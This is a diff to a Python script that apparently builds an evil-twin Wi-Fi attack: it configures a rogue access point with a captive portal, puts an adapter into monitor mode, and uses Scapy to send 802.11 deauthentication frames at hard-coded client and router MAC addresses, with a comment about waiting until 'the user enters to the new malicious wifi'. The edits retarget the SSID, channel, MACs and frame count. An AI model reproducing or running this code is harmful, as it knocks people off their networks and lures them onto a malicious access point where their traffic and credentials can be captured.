@@ -74,7 +74,7 @@ channel={wifi_channel}"""
 
 interface = "wlxc83a35c2e0a2"
 ssid = "eylon&michael"
-wifi_channel = 6
+wifi_channel = 11
 
 # Check that at least one argument was passed
 if len(sys.argv) > 2:
@@ -84,7 +84,7 @@ if len(sys.argv) > 2:
 
 ssid += "8"
 
-ssid = "Home2.4"
+ssid = "naamat"
 
 gateway_ip = "192.168.1.1"  # IP address of the router
 iface_router = "wlp0s20f3"
@@ -95,12 +95,12 @@ start_ap(interface, iface_router, gateway_ip, portal_address)
 create_ap_config(ssid, interface, wifi_channel)
 
 time.sleep(10)
-channel = 7
+channel = 11
 set_adapter_to_monitor(interface)
 # os.system("iwconfig %s channel %d" % (interface, channel))
-deauth = RadioTap() / Dot11(addr1="28:cd:c4:9b:87:f5", addr2="34:49:5b:17:a9:b4", addr3="34:49:5b:17:a9:b4") / Dot11Deauth()
+deauth = RadioTap() / Dot11(addr1="28:cd:c4:9b:87:f5", addr2="5c:b1:3e:ce:bd:35", addr3="5c:b1:3e:ce:bd:35") / Dot11Deauth()
 # Send the frame
 
 # loop until the user enters to the new malicious wifi
 
-sendp(deauth, iface=interface, count=300)
+sendp(deauth, iface=interface, count=30)
